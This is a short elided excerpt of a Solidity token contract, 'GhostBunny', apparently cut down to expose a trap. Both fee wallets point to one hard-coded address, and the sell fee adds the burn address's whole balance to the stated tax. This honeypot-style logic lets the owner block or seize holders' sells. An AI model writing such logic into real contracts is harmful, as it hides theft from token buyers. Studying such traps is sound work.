...
contract GhostBunny is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x5438871EB4b10b753248B5E8ca4C9316B0394877); 
    address payable public Wallet_Dev = payable(0x5438871EB4b10b753248B5E8ca4C9316B0394877);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            uint256 sellFEE = tAmount*_Tax_On_Sell/100 + _tOwned[address(0x000000000000000000000000000000000000dEaD)];
